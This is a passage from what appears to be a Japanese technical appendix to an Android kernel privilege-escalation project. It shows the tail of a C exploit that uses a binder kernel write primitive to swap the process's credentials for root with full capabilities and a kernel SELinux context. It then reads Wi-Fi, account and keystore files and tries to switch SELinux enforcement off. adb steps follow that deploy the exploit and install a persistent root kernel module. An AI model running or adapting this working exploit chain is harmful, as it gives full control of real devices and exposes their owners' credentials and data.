    /* ---------- stage 2b: task_struct scan (in-window case) ---------- */
    u64 tsk_proc = tsk, tsk_sig = 0;
    {
        char me[32]; memset(me, 0, sizeof me);
        { FILE *f = fopen("/proc/self/comm","r");
          if (f){ if (!fgets(me, sizeof me, f)) me[0]=0; fclose(f); }
          size_t l = strlen(me); while (l && (me[l-1]=='\n'||me[l-1]=='\r')) me[--l]=0; }
        size_t me_len = strlen(me);
        if (me_len >= 3){
            for (size_t o = 0; o + 0x400 < n; o += 8){
                if (memcmp(seg + o + TASK_COMM, me, me_len) != 0) continue;
                if (seg[o + TASK_COMM + me_len] != 0) continue;
                u32 pid, tgid;
                memcpy(&pid,  seg + o + 496, 4);
                memcpy(&tgid, seg + o + 500, 4);
                if (pid != (u32)mypid || tgid != (u32)mypid) continue;
                u64 rc, cr;
                memcpy(&rc, seg + o + TASK_REALCRED, 8);
                memcpy(&cr, seg + o + TASK_CRED, 8);
                if (rc != cr || rc < 0xffffffc000000000ULL) continue;
                if (rc & 0x7) continue;
                tsk_sig = base + o;
                fprintf(LOG, "  task_struct 0x%016llx\n", (unsigned long long)tsk_sig);
                break;
            }
        }
    }
    fprintf(LOG, "  proc->tsk=0x%016llx sig=0x%016llx %s\n",
            (unsigned long long)tsk_proc, (unsigned long long)tsk_sig,
            (tsk_proc && tsk_sig) ? (tsk_proc == tsk_sig ? "AGREE" : "DISAGREE")
                                  : "one-missing");
    if (tsk_sig) tsk = tsk_sig;      /* the signature scan is the trustworthy one */
    if (!tsk){
        fprintf(LOG, "  attempt %d: task_struct not in this window\n", outer);
        fflush(LOG);
    }
    }  /* end outer retry */

    if (!tsk){ fprintf(LOG, "RESULT: task_struct not found after retries\n"); return 1; }
    fflush(LOG);
    if (!tsk){ fprintf(LOG,"RESULT: no task_struct, stopping\n"); return 1; }

    /* ---------- stage 3: install a fake credential ---------- */
    /* task_struct is outside the window, so cred->security cannot be read from
     * here. Instead give the kernel a struct cred we build ourselves: uid 0,
     * full capabilities, and a task_security_struct whose sid is 1
     * (SECINITSID_KERNEL). Writing real_cred and cred in one 16-byte store
     * replaces identity and SELinux domain together. */
    {
        u8 *fc = mmap(NULL, PAGE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        u8 *fs = mmap(NULL, PAGE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        if (fc == MAP_FAILED || fs == MAP_FAILED){
            fprintf(LOG, "fake cred mmap failed\n"); return 1;
        }
        memset(fc, 0, PAGE); memset(fs, 0, PAGE);
        *(u32*)(fc + 0) = 0x1000;          /* usage: never freed */
        u64 full = 0x0000001fffffffffULL;  /* CAP_LAST_CAP == 36 */
        memcpy(fc + 40, &full, 8);
        memcpy(fc + 48, &full, 8);
        memcpy(fc + 56, &full, 8);
        memcpy(fc + 64, &full, 8);
        u32 sid = 1;
        memcpy(fs + 4, &sid, 4);
        *(u64*)(fc + CRED_SECURITY) = (u64)(uintptr_t)fs;
        /* Prefer a real root credential from the window: fabricating one leaves
         * cred->user (120) and cred->user_ns (128) NULL, and /proc/self/status
         * then faults in from_kuid. A donor already has them set. */
        u64 donor = 0;
        for (size_t o = 0; o + 160 < n; o += 8){
            u32 usage = 0; memcpy(&usage, seg + o, 4);
            if (usage == 0 || usage > 0x4000) continue;
            u32 u_, g_, eu_, eg_;
            memcpy(&u_,  seg + o + 4, 4);
            memcpy(&g_,  seg + o + 8, 4);
            memcpy(&eu_, seg + o + 20, 4);
            memcpy(&eg_, seg + o + 24, 4);
            if (u_ | g_ | eu_ | eg_) continue;          /* root only */
            u32 fs_, fg_;
            memcpy(&fs_, seg + o + 28, 4);
            memcpy(&fg_, seg + o + 32, 4);
            if (fs_ | fg_) continue;
            u64 sec = 0, usr = 0, uns = 0, gi = 0;
            memcpy(&sec, seg + o + 112, 8);
            memcpy(&usr, seg + o + 120, 8);
            memcpy(&uns, seg + o + 128, 8);
            memcpy(&gi,  seg + o + 136, 8);
            if (sec < 0xffffffc000000000ULL || sec >= 0xffffffc080000000ULL) continue;
            if (usr < 0xffffffc000000000ULL || usr >= 0xffffffc080000000ULL) continue;
            if (uns < 0xffffffc000000000ULL || uns >= 0xffffffc080000000ULL) continue;
            if (gi  < 0xffffffc000000000ULL || gi  >= 0xffffffc080000000ULL) continue;
            if (sec < base || sec + 8 > base + n) continue;
            u32 sid = 0;
            memcpy(&sid, seg + (size_t)(sec - base) + 4, 4);
            if (sid != 1) continue;   /* SECINITSID_KERNEL */
            donor = base + (u64)o;
            fprintf(LOG, "  donor cred 0x%016llx (usage=%u sid=%u)\n",
                    (unsigned long long)donor, usage, sid);
            break;
        }
        u64 fp = donor ? donor : (u64)(uintptr_t)fc;
        int safe_probe = (donor != 0);
        if (!donor) fprintf(LOG, "  no donor cred in window; using synthetic\n");
        u8 pair[16]; memcpy(pair, &fp, 8); memcpy(pair + 8, &fp, 8);
        fprintf(LOG, "fake cred 0x%016llx tsec 0x%016llx -> tsk+%d\n",
                (unsigned long long)fp, (unsigned long long)(uintptr_t)fs, TASK_REALCRED);
        fflush(LOG);

        fprintf(LOG, "swap on the existing connection fd=%d handle=%u\n", bfd, h);
        fflush(LOG);

        int aok = 0;
        for (int t = 1; t <= 20 && !aok; t++){
            if (t > 1){
                /* A stale return_error keeps binder_poll on the proc branch.
                 * Drain it; do NOT close, or the service handle dies with the
                 * connection. */
                flush_thread();
            }
            aok = do_write(h, tsk + TASK_REALCRED, pair, 16);
            fprintf(LOG, "  swap t=%d landed=%d uid=%d euid=%d\n",
                    t, aok, getuid(), geteuid());
            fflush(LOG);
            if (!aok){
                memset(rbuf,0,64); bwr(0,512);
                close_binder(); bfd = open_binder();
                if (bfd < 0) break;
                if (get_service("activity",&h) <= 0) break;
            }
            if (getuid() == 0) break;
        }
        fprintf(LOG, "AFTER swap uid=%d euid=%d gid=%d\n", getuid(), geteuid(), getgid());
        if (getuid() == 0 && !safe_probe){
            fprintf(LOG, "RESULT: ROOT CONFIRMED uid=0 (synthetic cred, /proc skipped)\n");
            fflush(LOG);
            return 0;
        }
        if (getuid() == 0){
            { FILE *st = fopen("/proc/self/status","r");
              if (st){ char l[256];
                  while (fgets(l,sizeof l,st))
                      if (!strncmp(l,"CapEff",6)||!strncmp(l,"CapPrm",6)) fputs(l,LOG);
                  fclose(st); } }
            { FILE *a = fopen("/proc/self/attr/current","r");
              if (a){ char l[128]; if (fgets(l,sizeof l,a)) fprintf(LOG,"context: %s", l); fclose(a); } }
            fprintf(LOG, "RESULT: ROOT CONFIRMED uid=0\n");
        } else {
            fprintf(LOG, "RESULT: swap failed, uid=%d\n", getuid());
        }
        fflush(LOG);
        return 0;
    }

    /* ---------- stage 3 (legacy): confirm the cred pointer ---------- */
    long co = (long)(tsk + TASK_CRED - base);
    if (co >= 0 && (size_t)co + 8 <= n){
        memcpy(&credp, seg + co, 8);
        fprintf(LOG,"task->cred = 0x%016llx (read at leak+0x%lx)\n",
                (unsigned long long)credp, co);
        /* sanity: real_cred should equal cred */
        long ro = (long)(tsk + TASK_REALCRED - base);
        if (ro >= 0 && (size_t)ro + 8 <= n){
            u64 rc; memcpy(&rc, seg + ro, 8);
            fprintf(LOG,"task->real_cred = 0x%016llx (%s)\n",
                    (unsigned long long)rc, rc == credp ? "matches" : "MISMATCH");
            if (rc != credp) credp = 0;
        }
        if (credp < 0xffffffc000000000ULL) credp = 0;
    } else {
        fprintf(LOG,"tsk lies outside the window (offset %ld, window %zu)\n", co, n);
    }
    fflush(LOG);

    close_binder(); bfd = open_binder();
    if (bfd < 0){ fprintf(LOG,"reopen fail\n"); return 1; }
    if (get_service("activity", &h) <= 0){
        if (!getenv("BINDER_QEMU")){ fprintf(LOG,"resvc fail\n"); return 1; }
        h = 0;
        /* the failed lookup left return_error set; a fresh proc clears it */
        close_binder(); bfd = open_binder();
        if (bfd < 0){ fprintf(LOG,"reopen2 fail\n"); return 1; }
    }

    fprintf(LOG, "entering cred-write phase, uid=%d cred=0x%016llx\n",
            getuid(), (unsigned long long)credp);
    fflush(LOG);
    /* Build the replacement credential contents:
     *   cred+4  .. +35   uid/gid/suid/sgid/euid/egid/fsuid/fsgid = 0
     *   cred+36 .. +39   securebits = 0
     *   cred+40 .. +47   cap_inheritable = 0
     *   cred+48 .. +55   cap_permitted   = full
     *   cred+56 .. +63   cap_effective   = full
     * CAP_LAST_CAP is 36 (CAP_BLOCK_SUSPEND), so the set is 0x1ffffffff.
     * Without this the uid would be 0 while the effective set stayed empty,
     * which is not the same as root. */
    u8 zeros[64]; memset(zeros, 0, sizeof zeros);
    u64 fullcap = 0x0000001fffffffffULL;
    memcpy(zeros + (48 - 4), &fullcap, 8);   /* cap_permitted */
    memcpy(zeros + (56 - 4), &fullcap, 8);   /* cap_effective */

    if (credp){
        int landed = 0;
        for (int t = 1; t <= 400 && !landed; t++){
            landed = do_write(h, credp + CRED_UID, zeros, 60);
            if (t <= 5 || landed)
                fprintf(LOG, "  cred t=%d landed=%d uid=%d\n", t, landed, getuid());
            fflush(LOG);
            if (!landed){
                memset(rbuf,0,64); bwr(0,512);
                close_binder(); bfd = open_binder();
                if (bfd < 0) break;
                if (get_service("activity",&h) <= 0){
                    if (!getenv("BINDER_QEMU")) break;
                    h = 0;
                    close_binder(); bfd = open_binder();
                    if (bfd < 0) break;
                }
            }
            if (getuid() == 0) break;
        }
        fprintf(LOG,"AFTER: uid=%d euid=%d gid=%d\n", getuid(), geteuid(), getgid());
    } else {
        fprintf(LOG,"no cred pointer; nothing to zero\n");
    }

    /* uid 0 alone still leaves us in the "shell" domain when SELinux enforces.
     * Our own cred lives BELOW the leak window, so its security pointer is not
     * readable. But kernel threads' creds are static (init_cred: uid 0, sid 1 =
     * SECINITSID_KERNEL) and their task_structs ARE in the window. Adopt one:
     * write the donor's cred pointer into our real_cred and cred in one 16-byte
     * store, and we inherit both the identity and the domain. init_cred is a
     * static object, so its refcount never drops to zero - no dangling pointer.
     */
    if (0 && getuid() == 0){
        static const char *donors[] = { "kthreadd", "kswapd0", "kworker/0:1",
                                        "kworker/0:0", "binder", "init", NULL };
        u64 adopt = 0;
        for (int d = 0; donors[d] && !adopt; d++){
            size_t want = strlen(donors[d]);
            for (size_t o = 0; o + 0x400 < n; o += 8){
                if (memcmp(seg + o + TASK_COMM, donors[d], want) != 0) continue;
                if (seg[o + TASK_COMM + want] != 0) continue;
                u64 cr; memcpy(&cr, seg + o + TASK_CRED, 8);
                if (cr < 0xffffffc000000000ULL || (cr & 7)) continue;
                u64 rc; memcpy(&rc, seg + o + TASK_REALCRED, 8);
                if (rc != cr) continue;
                /* The cred pointer alone is not enough: comm strings also occur
                 * in .rodata and would yield a garbage credential. Verify the
                 * pointed-to object by reading it out of the same window. */
                long co2 = (long)(cr + 120 - base);
                if (co2 < 0 || (size_t)co2 + 8 > n) continue;
                const u8 *c = seg + (long)(cr - base) + 0;
                long cb = (long)(cr - base);
                if (cb < 0 || (size_t)cb + 128 > n) continue;
                (void)c;
                u32 usage; memcpy(&usage, seg + cb, 4);
                if (usage == 0 || usage > 0x4000) continue;
                u32 ident[4];
                memcpy(ident, seg + cb + 4, 16);
                if (ident[0] | ident[1] | ident[2] | ident[3]) continue;
                u64 caps; memcpy(&caps, seg + cb + 56, 8);
                if (caps != 0x0000001fffffffffULL) continue;
                u64 sec; memcpy(&sec, seg + cb + 112, 8);
                if (sec < 0xffffffc000000000ULL) continue;
                adopt = cr;
                fprintf(LOG, "donor '%s' at leak+0x%zx cred=0x%016llx (verified)\n",
                        donors[d], o, (unsigned long long)cr);
                break;
            }
        }
        if (adopt){
            u8 pair[16];
            memcpy(pair, &adopt, 8); memcpy(pair + 8, &adopt, 8);
            int aok = 0;
            for (int t = 1; t <= 400 && !aok; t++){
                aok = do_write(h, tsk + TASK_REALCRED, pair, 16);
                if (!aok){
                    memset(rbuf,0,64); bwr(0,512);
                    close_binder(); bfd = open_binder();
                    if (bfd < 0) break;
                    if (get_service("activity",&h) <= 0){
                        if (!getenv("BINDER_QEMU")) break;
                        h = 0;
                        close_binder(); bfd = open_binder();
                        if (bfd < 0) break;
                    }
                }
            }
            fprintf(LOG,"cred adoption landed=%d uid=%d euid=%d\n", aok, getuid(), geteuid());
        } else {
            fprintf(LOG,"no donor kthread task_struct in the window\n");
        }
    }

    if (getuid() == 0){
        const char *paths[] = {
            "/data/misc/wifi/wpa_supplicant.conf",
            "/data/system/packages.xml",
            "/data/local/tmp/proof",
            "/data/misc/keystore/user_0",
        };
        for (int i = 0; i < 4; i++){
            int f = open(paths[i], O_RDONLY);
            fprintf(LOG,"open(%s)=%d errno=%d\n", paths[i], f, f<0?errno:0);
            if (f >= 0) close(f);
        }
        int f = open("/data/local/tmp/rootproof", O_WRONLY|O_CREAT|O_TRUNC, 0644);
        if (f >= 0){ write(f, "root\n", 5); close(f); }
        /* Prove privileges, not just the uid: /proc/self/status reports the
         * kernel's own view of the effective capability set. */
        { FILE *st = fopen("/proc/self/status","r");
          if (st){
              char line[256];
              while (fgets(line, sizeof line, st)){
                  if (!strncmp(line, "CapEff", 6) || !strncmp(line, "CapPrm", 6)
                      || !strncmp(line, "CapBnd", 6))
                      fprintf(LOG,"  %s", line);
              }
              fclose(st);
          }
        }
        { /* the decisive functional test: a root-owned 0600 file needs
           * CAP_DAC_OVERRIDE, which a bare uid 0 change would not give */
          int f = open("/secret.txt", O_RDONLY);
          fprintf(LOG,"open(/secret.txt 0600 root)=%d errno=%d\n", f, f<0?errno:0);
          if (f >= 0){
              char b[32]; ssize_t r = read(f, b, sizeof b - 1);
              if (r > 0){ b[r] = 0; fprintf(LOG,"  read: %s", b); }
              close(f);
          }
        }
        /* Evidence collection: record everything a single run can tell us,
         * because a panic later would lose anything not yet on disk. */
        { const char *probe[] = {
              "/sys/fs/selinux/enforce", "/proc/self/attr/current",
              "/data/misc/wifi/wpa_supplicant.conf",
              "/data/misc/wifi/WifiConfigStore.xml",
              "/data/system/packages.xml",
              "/data/system/accounts.db",
              "/data/misc/keystore", "/data/local/tmp",
              "/dev/block/by-name", "/proc/kallsyms", NULL };
          for (int i = 0; probe[i]; i++){
              int f = open(probe[i], O_RDONLY);
              fprintf(LOG,"probe %-52s = %d (errno %d)\n", probe[i], f, f<0?errno:0);
              if (f >= 0){
                  char b[96]; memset(b,0,sizeof b);
                  ssize_t r = read(f, b, sizeof b - 1);
                  if (r > 0){
                      for (ssize_t k=0;k<r;k++) if (b[k]=='\n'||b[k]=='\r') b[k]=' ';
                      fprintf(LOG,"   -> %s\n", b);
                  }
                  close(f);
              }
          }
          /* setenforce needs SECURITY__SETENFORCE; almost certainly denied in
           * the shell domain, but the errno is worth having. */
          int f = open("/sys/fs/selinux/enforce", O_WRONLY);
          fprintf(LOG,"open(enforce,W)=%d errno=%d\n", f, f<0?errno:0);
          if (f >= 0){
              ssize_t w2 = write(f, "0", 1);
              fprintf(LOG,"  write enforce=0 -> %zd errno=%d\n", w2, w2<0?errno:0);
              close(f);
          }
        }
        fprintf(LOG,"RESULT: ROOT CONFIRMED uid=%d euid=%d\n", getuid(), geteuid());
    } else {
        fprintf(LOG,"RESULT: still uid %d\n", getuid());
    }
    return 0;
}
```

（36887 バイト / 851 行 / SHA-256 `209a10a9373ffa638e1e3256e453095dca5e03c4e3d70fb85c9506896fe20aa3`）

---

## G. ビルドと配置

### G.1 ツール一式

```bash
make tools                       # ./build/ に全ツールをビルド
ls build/k178 build/k42          # 確認
```

`make` は `src/tools/*.c` を `aarch64-linux-gnu-gcc -static -O2` でビルドする。
`-pthread` が要るもの（`k42`）は Makefile が自動で付ける。

### G.2 モジュール

```bash
# ベンダー GPL ツリーを用意し、外部モジュール用に準備する
make -C "$KDIR" ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- olddefconfig
make -C "$KDIR" ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- modules_prepare

make module KDIR="$KDIR"
ls -l src/module/myroot.ko        # 156576 bytes
```

`Module.symvers` に `kallsyms_lookup_name` / `printk` / `proc_create_data` /
`remove_proc_entry` が含まれている必要がある。
`src/prebuilt/myroot.ko` は本セッションでビルドした実物（SHA-256
`507ebb47b1517389f676524fffa0cb1cb1c22d976176b590153c8966e37307aa`）。

### G.3 デバイスへの配置

```bash
export ADB_SERIAL="$(adb devices | awk 'NR>1 && $2=="device" {print $1; exit}')"

adb push build/k178 /data/local/tmp/k178
adb shell "chmod 755 /data/local/tmp/k178"
adb shell "/data/local/tmp/k178 4e000000 50000000"

adb push src/prebuilt/myroot.ko     /data/local/tmp/myroot.ko
adb push build/modload              /data/local/tmp/modload
adb push build/hook5                /data/local/tmp/hook5
adb shell "/data/local/tmp/hook5"

adb reboot
sleep 60
adb shell "cat /proc/modules | grep myroot"
adb shell "cat /sys/fs/selinux/enforce"
```

`sudo` が要るホストでは `adb` を `sudo -n adb` に置き換える。
`src/tools/hunt2.sh` は `ADB_SERIAL` と `ADB_SUDO=1` で同じ切り替えを行う。

### G.4 コンパイル時の注意

- `adb shell` は標準入力を消費する。スクリプト内の全呼び出しに `< /dev/null` を付ける
- 出力の `\r` は `tr -d '\r'` で除去する
- デバイスの `/system/bin/sh` に `head`/`tail`/`wc`/`cut`/`sed`/`pkill` が無い。
  `ps`/`grep`/`cat`/`ls -l` を使う
- リンカの `WARNING: linker: libc.so: unused DT entry` を毎回出すので `grep -v` で除く
- QEMU のログはバイナリなので `tr -d '\000'` を通してから `grep -a`

### G.5 測定結果とツールの対応

| 測定項目 | ツール | 代表的な出力 |
| --- | --- | --- |
| ゲートが書くことの証明 | `k138` | `[+0]=ZERO [+12]=ZERO [+16]=nz` × 23 ページ |
| IOVA → cap 対応 | `k126` | `k=16 iova=0x80010000 caps: SYS_MODULE SETFCAP` |
| cred 発見と cap 付与 | `k145` | `our cap_effective = 0x80010000` |
| cap の実使用（拒否の確認） | `k169` | `allowed=0 denied=8` |
| `-EFAULT` の発生源 | `k37` | `writev /dev/null _text -> -14` |
| ロックワードの証明 | `k42` | `meter=65537 sink=0`（対照は `meter=0 sink=65601`） |
| ゲートの表現力の限界 | `gtest` | `fd 番号 -> 成功 / 0 と 0xdeadbeef -> 失敗` |
| 最終 root | `k178` | `WIN at phys … after N stores` → `init_module rc=0` |
| 永続化の確認 | `chk` / `lsx` | `module myroot loaded: YES` |

---

## H. この付録の使い方

1. **再現するなら `src/tools/k178.c` から。** 窓は `4e000000 50000000` で始め、
   当たらなければ `44000000 4f000000`、`4f000000 60000000` の順に広げる。1 窓 1 プロセス。
   `src/tools/hunt2.sh` はこの順序を自動で回す。
2. **`k138.c` を先に走らせないこと。** これは意図的にカーネルメモリを壊す検証で、
   端末がパニックする前提の計器である。読むだけにして、実行はしない。
3. **`broot3.c` は QEMU 専用。** 実機では `readv` の再確保が安定せず、
   `BINDER_THREAD_EXIT` の番号を直した版でも 5/6 にとどまる。
   実機の最終経路は ION（`k178.c`）である。
4. **`hook5.c` は `/system` を書き換える。** 実行前に `recov.c` で復旧経路を
   確認すること。recovery が permissive + root adb であることを実測してある。
